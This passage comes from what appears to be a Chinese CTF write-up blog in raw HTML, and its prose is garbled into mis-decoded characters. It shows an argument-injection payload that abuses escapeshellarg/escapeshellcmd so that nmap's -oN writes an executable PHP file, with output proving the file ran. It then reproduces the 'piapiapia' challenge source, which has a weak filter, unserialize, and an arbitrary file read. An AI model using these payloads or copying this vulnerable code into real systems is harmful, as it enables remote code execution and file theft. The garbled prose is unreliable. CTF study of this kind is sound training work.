\"</span>.$eep;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $ep.<span class=\"string\">\"\\n\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $eep.<span class=\"string\">\"\\n\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $cmd.<span class=\"string\">\"\\n\"</span>;</span><br><span class=\"line\">system($cmd);</span><br><span class=\"line\"></span><br><span class=\"line\">è¾“å‡ºï¼š</span><br><span class=\"line\"> <span class=\"string\">' &lt;?php echo `ls`;?&gt; -oN 1.php '</span> </span><br><span class=\"line\"><span class=\"string\">' '</span>\\<span class=\"string\">''</span> <span class=\"meta\">&lt;?php</span> <span class=\"keyword\">echo</span> `ls`;<span class=\"meta\">?&gt;</span> -oN <span class=\"number\">1.</span>php <span class=\"string\">'\\''</span> <span class=\"string\">'</span></span><br><span class=\"line\"><span class=\"string\">'</span> <span class=\"string\">'\\\\'</span><span class=\"string\">' \\&lt;\\?php echo \\`ls\\`\\;\\?\\&gt; -oN 1.php '</span>\\\\<span class=\"string\">''</span> <span class=\"string\">'</span></span><br><span class=\"line\"><span class=\"string\">nmap '</span> <span class=\"string\">'\\\\'</span><span class=\"string\">' \\&lt;\\?php echo \\`ls\\`\\;\\?\\&gt; -oN 1.php '</span>\\\\<span class=\"string\">''</span> <span class=\"string\">'</span></span><br><span class=\"line\"><span class=\"string\">Starting Nmap 7.70 ( https://nmap.org ) at 2020-04-23 20:06 CST</span></span><br></pre></td></tr></table></figure>\n\n<p>æŸ¥çœ‹ 1.php å¯ä»¥çœ‹åˆ°æ‰§è¡Œçš„å‘½ä»¤æ˜¯</p>\n<p><code>nmap -oN 1.php \\ &lt;?php echo</code>ls<code>;?&gt; \\\\</code></p>\n<p> æˆ‘ä»¬ä¼ å…¥å‚æ•° <code>&#39; &lt;?php echo &#39;ls&#39;;?&gt; -oN 1.php &#39;</code>  , åŠ çš„å•å¼•å·ç›®çš„æ˜¯ä¸ºäº†é€šè¿‡å•å¼•å·é—­åˆè½¬ä¹‰åŠ ä¸Šçš„å•å¼•å·ã€‚</p>\n<p>éœ€è¦æ³¨æ„çš„æ˜¯å‚æ•°åé¢çš„å•å¼•å·éœ€è¦éš”ä¸€ä¸ªç©ºæ ¼ï¼Œä¸ç„¶ç”Ÿæˆçš„æ–‡ä»¶åå°±ä¼šæ˜¯ <code>.php\\\\</code> ,ä¸èƒ½è¢«æ­£å¸¸è§£æäº†ã€‚ éšæœºæˆ‘ä»¬è¿è¡Œ 1.php ,å¯ä»¥çœ‹åˆ°æˆåŠŸè§£æäº†ã€‚</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@kali:~/æ¡Œé¢# php 1.php</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> Nmap 7.70 scan initiated Sat Apr 25 11:16:03 2020 as: nmap -oN 1.php \\ 1.php</span></span><br><span class=\"line\">1.php\\\\ </span><br><span class=\"line\">1.txt</span><br><span class=\"line\">ctf</span><br><span class=\"line\">dc-2.txt</span><br><span class=\"line\">escapeshellarg.php</span><br><span class=\"line\">index.php~</span><br><span class=\"line\">pickle1.py</span><br><span class=\"line\">shell-7.x-1.0-beta5.zip</span><br><span class=\"line\">shell.py</span><br><span class=\"line\">snippet.py</span><br><span class=\"line\">test.php</span><br><span class=\"line\">th.jpeg</span><br><span class=\"line\">top6000.txt</span><br><span class=\"line\"> \\\\</span><br><span class=\"line\">Failed to resolve \"\\\".</span><br><span class=\"line\">Failed to resolve \"&lt;?php\".</span><br></pre></td></tr></table></figure>\n\n<p>å¯¹äºæœ¬é¢˜ï¼Œå¯ä»¥ä¼ å…¥</p>\n<p><code>&#39; &lt;?php echo &#39;ls&#39;;?&gt; -oN 1.php  &#39;</code></p>\n<h3 id=\"piapiapia\"><a href=\"#piapiapia\" class=\"headerlink\" title=\"piapiapia\"></a>piapiapia</h3><p>æ‰«æç›®å½•å¾—åˆ°æºç </p>\n<p>class.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">require</span>(<span class=\"string\">'config.php'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">user</span> <span class=\"keyword\">extends</span> <span class=\"title\">mysql</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">private</span> $table = <span class=\"string\">'users'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">is_exists</span><span class=\"params\">($username)</span> </span>&#123;</span><br><span class=\"line\">\t\t$username = <span class=\"keyword\">parent</span>::filter($username);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$where = <span class=\"string\">\"username = '$username'\"</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"keyword\">parent</span>::select(<span class=\"keyword\">$this</span>-&gt;table, $where);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">register</span><span class=\"params\">($username, $password)</span> </span>&#123;</span><br><span class=\"line\">\t\t$username = <span class=\"keyword\">parent</span>::filter($username);</span><br><span class=\"line\">\t\t$password = <span class=\"keyword\">parent</span>::filter($password);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$key_list = <span class=\"keyword\">Array</span>(<span class=\"string\">'username'</span>, <span class=\"string\">'password'</span>);</span><br><span class=\"line\">\t\t$value_list = <span class=\"keyword\">Array</span>($username, md5($password));</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"keyword\">parent</span>::insert(<span class=\"keyword\">$this</span>-&gt;table, $key_list, $value_list);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">login</span><span class=\"params\">($username, $password)</span> </span>&#123;</span><br><span class=\"line\">\t\t$username = <span class=\"keyword\">parent</span>::filter($username);</span><br><span class=\"line\">\t\t$password = <span class=\"keyword\">parent</span>::filter($password);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$where = <span class=\"string\">\"username = '$username'\"</span>;</span><br><span class=\"line\">\t\t$object = <span class=\"keyword\">parent</span>::select(<span class=\"keyword\">$this</span>-&gt;table, $where);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> ($object &amp;&amp; $object-&gt;password === md5($password)) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">\t\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">show_profile</span><span class=\"params\">($username)</span> </span>&#123;</span><br><span class=\"line\">\t\t$username = <span class=\"keyword\">parent</span>::filter($username);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$where = <span class=\"string\">\"username = '$username'\"</span>;</span><br><span class=\"line\">\t\t$object = <span class=\"keyword\">parent</span>::select(<span class=\"keyword\">$this</span>-&gt;table, $where);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> $object-&gt;profile;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">update_profile</span><span class=\"params\">($username, $new_profile)</span> </span>&#123;</span><br><span class=\"line\">\t\t$username = <span class=\"keyword\">parent</span>::filter($username);</span><br><span class=\"line\">\t\t$new_profile = <span class=\"keyword\">parent</span>::filter($new_profile);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$where = <span class=\"string\">\"username = '$username'\"</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"keyword\">parent</span>::update(<span class=\"keyword\">$this</span>-&gt;table, <span class=\"string\">'profile'</span>, $new_profile, $where);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__tostring</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"keyword\">__class__</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">mysql</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">private</span> $link = <span class=\"keyword\">null</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">connect</span><span class=\"params\">($config)</span> </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">$this</span>-&gt;link = mysql_connect(</span><br><span class=\"line\">\t\t\t$config[<span class=\"string\">'hostname'</span>],</span><br><span class=\"line\">\t\t\t$config[<span class=\"string\">'username'</span>], </span><br><span class=\"line\">\t\t\t$config[<span class=\"string\">'password'</span>]</span><br><span class=\"line\">\t\t);</span><br><span class=\"line\">\t\tmysql_select_db($config[<span class=\"string\">'database'</span>]);</span><br><span class=\"line\">\t\tmysql_query(<span class=\"string\">\"SET sql_mode='strict_all_tables'\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;link;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">select</span><span class=\"params\">($table, $where, $ret = <span class=\"string\">'*'</span>)</span> </span>&#123;</span><br><span class=\"line\">\t\t$sql = <span class=\"string\">\"SELECT $ret FROM $table WHERE $where\"</span>;</span><br><span class=\"line\">\t\t$result = mysql_query($sql, <span class=\"keyword\">$this</span>-&gt;link);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> mysql_fetch_object($result);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">insert</span><span class=\"params\">($table, $key_list, $value_list)</span> </span>&#123;</span><br><span class=\"line\">\t\t$key = implode(<span class=\"string\">','</span>, $key_list);</span><br><span class=\"line\">\t\t$value = <span class=\"string\">'\\''</span> . implode(<span class=\"string\">'\\',\\''</span>, $value_list) . <span class=\"string\">'\\''</span>; </span><br><span class=\"line\">\t\t$sql = <span class=\"string\">\"INSERT INTO $table ($key) VALUES ($value)\"</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> mysql_query($sql);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">update</span><span class=\"params\">($table, $key, $value, $where)</span> </span>&#123;</span><br><span class=\"line\">\t\t$sql = <span class=\"string\">\"UPDATE $table SET $key = '$value' WHERE $where\"</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> mysql_query($sql);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">filter</span><span class=\"params\">($string)</span> </span>&#123;</span><br><span class=\"line\">\t\t$escape = <span class=\"keyword\">array</span>(<span class=\"string\">'\\''</span>, <span class=\"string\">'\\\\\\\\'</span>);</span><br><span class=\"line\">\t\t$escape = <span class=\"string\">'/'</span> . implode(<span class=\"string\">'|'</span>, $escape) . <span class=\"string\">'/'</span>; <span class=\"comment\">// \\|\\\\\\\\</span></span><br><span class=\"line\">\t\t$string = preg_replace($escape, <span class=\"string\">'_'</span>, $string);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$safe = <span class=\"keyword\">array</span>(<span class=\"string\">'select'</span>, <span class=\"string\">'insert'</span>, <span class=\"string\">'update'</span>, <span class=\"string\">'delete'</span>, <span class=\"string\">'where'</span>);</span><br><span class=\"line\">\t\t$safe = <span class=\"string\">'/'</span> . implode(<span class=\"string\">'|'</span>, $safe) . <span class=\"string\">'/i'</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> preg_replace($safe, <span class=\"string\">'hacker'</span>, $string);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__tostring</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"keyword\">__class__</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">session_start();</span><br><span class=\"line\">$user = <span class=\"keyword\">new</span> user();</span><br><span class=\"line\">$user-&gt;connect($config);</span><br></pre></td></tr></table></figure>\n\n<p>config.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">\t$config[<span class=\"string\">'hostname'</span>] = <span class=\"string\">'127.0.0.1'</span>;</span><br><span class=\"line\">\t$config[<span class=\"string\">'username'</span>] = <span class=\"string\">'root'</span>;</span><br><span class=\"line\">\t$config[<span class=\"string\">'password'</span>] = <span class=\"string\">''</span>;</span><br><span class=\"line\">\t$config[<span class=\"string\">'database'</span>] = <span class=\"string\">''</span>;</span><br><span class=\"line\">\t$flag = <span class=\"string\">''</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>profile.php</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">\trequire_once(&apos;class.php&apos;);</span><br><span class=\"line\">\tif($_SESSION[&apos;username&apos;] == null) &#123;</span><br><span class=\"line\">\t\tdie(&apos;Login First&apos;);\t</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t$username = $_SESSION[&apos;username&apos;];</span><br><span class=\"line\">\t$profile=$user-&gt;show_profile($username);</span><br><span class=\"line\">\tif($profile  == null) &#123;</span><br><span class=\"line\">\t\theader(&apos;Location: update.php&apos;);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\telse &#123;</span><br><span class=\"line\">\t\t$profile = unserialize($profile);</span><br><span class=\"line\">\t\t$phone = $profile[&apos;phone&apos;];</span><br><span class=\"line\">\t\t$email = $profile[&apos;email&apos;];</span><br><span class=\"line\">\t\t$nickname = $profile[&apos;nickname&apos;];</span><br><span class=\"line\">\t\t$photo = base64_encode(file_get_contents($profile[&apos;photo&apos;]));</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">   &lt;title&gt;Profile&lt;/title&gt;</span><br><span class=\"line\">   &lt;link href=&quot;static/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class=\"line\">   &lt;script src=&quot;static/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class=\"line\">   &lt;script src=&quot;static/bootstrap.min.js&quot;&gt;&lt;/script&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">\t&lt;div class=&quot;container&quot; style=&quot;margin-top:100px&quot;&gt;  </span><br><span class=\"line\">\t\t&lt;img src=&quot;data:image/gif;base64,&lt;?php echo $photo; ?&gt;&quot; class=&quot;img-memeda &quot; style=&quot;width:180px;margin:0px auto;&quot;&gt;</span><br><span class=\"line\">\t\t&lt;h3&gt;Hi &lt;?php echo $nickname;?&gt;&lt;/h3&gt;</span><br><span class=\"line\">\t\t&lt;label&gt;Phone: &lt;?php echo $phone;?&gt;&lt;/label&gt;</span><br><span class=\"line\">\t\t&lt;label&gt;Email: &lt;?php echo $email;?&gt;&lt;/label&gt;</span><br><span class=\"line\">\t&lt;/div&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>update.php</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">\trequire_once(&apos;class.php&apos;);</span><br><span class=\"line\">\tif($_SESSION[&apos;username&apos;] == null) &#123;</span><br><span class=\"line\">\t\tdie(&apos;Login First&apos;);\t</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tif($_POST[&apos;phone&apos;] &amp;&amp; $_POST[&apos;email&apos;] &amp;&amp; $_POST[&apos;nickname&apos;] &amp;&amp; $_FILES[&apos;photo&apos;]) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$username = $_SESSION[&apos;username&apos;];</span><br><span class=\"line\">\t\tif(!preg_match(&apos;/^\\d&#123;11&#125;$/&apos;, $_POST[&apos;phone&apos;]))</span><br><span class=\"line\">\t\t\tdie(&apos;Invalid phone&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tif(!preg_match(&apos;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\\.[_a-zA-Z0-9]&#123;1,10&#125;$/&apos;, $_POST[&apos;email&apos;]))</span><br><span class=\"line\">\t\t\tdie(&apos;Invalid email&apos;);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tif(preg_match(&apos;/[^a-zA-Z0-9_]/&apos;, $_POST[&apos;nickname&apos;]) || strlen($_POST[&apos;nickname&apos;]) &gt; 10)</span><br><span class=\"line\">\t\t\tdie(&apos;Invalid nickname&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$file = $_FILES[&apos;photo&apos;];</span><br><span class=\"line\">\t\tif($file[&apos;size&apos;] &lt; 5 or $file[&apos;size&apos;] &gt; 1000000)</span><br><span class=\"line\">\t\t\tdie(&apos;Photo size error&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tmove_uploaded_file($file[&apos;tmp_name&apos;], &apos;upload/&apos; . md5($file[&apos;name&apos;]));</span><br><span class=\"line\">\t\t$profile[&apos;phone&apos;] = $_POST[&apos;phone&apos;];</span><br><span class=\"line\">\t\t$profile[&apos;email&apos;] = $_POST[&apos;email&apos;];</span><br><span class=\"line\">\t\t$profile[&apos;nickname&apos;] = $_POST[&apos;nickname&apos;];</span><br><span class=\"line\">\t\t$profile[&apos;photo&apos;] = &apos;upload/&apos; . md5($file[&apos;name&apos;]);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t$user-&gt;update_profile($username, serialize($profile));</span><br><span class=\"line\">\t\techo &apos;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&apos;;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\telse &#123;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">   &lt;title&gt;UPDATE&lt;/title&gt;</span><br><span class=\"line\">   &lt;link href=&quot;static/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class=\"line\">   &lt;script src=&quot;static/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class=\"line\">   &lt;script src=&quot;static/bootstrap.min.js&quot;&gt;&lt;/script&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">\t&lt;div class=&quot;container&quot; style=&quot;margin-top:100px&quot;&gt;  </span><br><span class=\"line\">\t\t&lt;form action=&quot;update.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; class=&quot;well&quot; style=&quot;width:220px;margin:0px auto;&quot;&gt; </span><br><span class=\"line\">\t\t\t&lt;img src=&quot;static/piapiapia.gif&quot; class=&quot;img-memeda &quot; style=&quot;width:180px;margin:0px auto;&quot;&gt;</span><br><span class=\"line\">\t\t\t&lt;h3&gt;Please Update Your Profile&lt;/h3&gt;</span><br><span class=\"line\">\t\t\t&lt;label&gt;Phone:&lt;/label&gt;</span><br><span class=\"line\">\t\t\t&lt;input type=&quot;text&quot; name=&quot;phone&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class=\"line\">\t\t\t&lt;label&gt;Email:&lt;/label&gt;</span><br><span class=\"line\">\t\t\t&lt;input type=&quot;text&quot; name=&quot;email&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class=\"line\">\t\t\t&lt;label&gt;Nickname:&lt;/label&gt;</span><br><span class=\"line\">\t\t\t&lt;input type=&quot;text&quot; name=&quot;nickname&quot; style=&quot;height:30px&quot; class=&quot;span3&quot;&gt;</span><br><span class=\"line\">\t\t\t&lt;label for=&quot;file&quot;&gt;Photo:&lt;/label&gt;</span><br><span class=\"line\">\t\t\t&lt;input type=&quot;file&quot; name=&quot;photo&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class=\"line\">\t\t\t&lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;UPDATE&lt;/button&gt;</span><br><span class=\"line\">\t\t&lt;/form&gt;</span><br><span class=\"line\">\t&lt;/div&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>åœ¨ <code>profile.php</code> ä¸­æ‰¾åˆ°æ˜æ˜¾çš„ </p>\n<p><code>$photo = base64_encode(file_get_contents($profile[&#39;photo&#39;]));</code> </p>\n<p>è¯»å–æ–‡ä»¶å†…å®¹ï¼Œè€Œ <code>flag</code> æ”¾åœ¨ <code>config.php</code> æ–‡ä»¶ä¸­ï¼Œæˆ‘ä»¬è¦æƒ³åŠæ³•è¯»è¿™ä¸ªæ–‡ä»¶ã€‚ä½†æ˜¯ä¸Šé¢è¯»æ–‡ä»¶çš„å‚æ•°é™å®šäº† <code>photo</code> ï¼Œæˆ‘ä»¬åœ¨ <code>update.php</code> ä¸­æ‰¾åˆ°æœ‰å…³ä»£ç </p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span 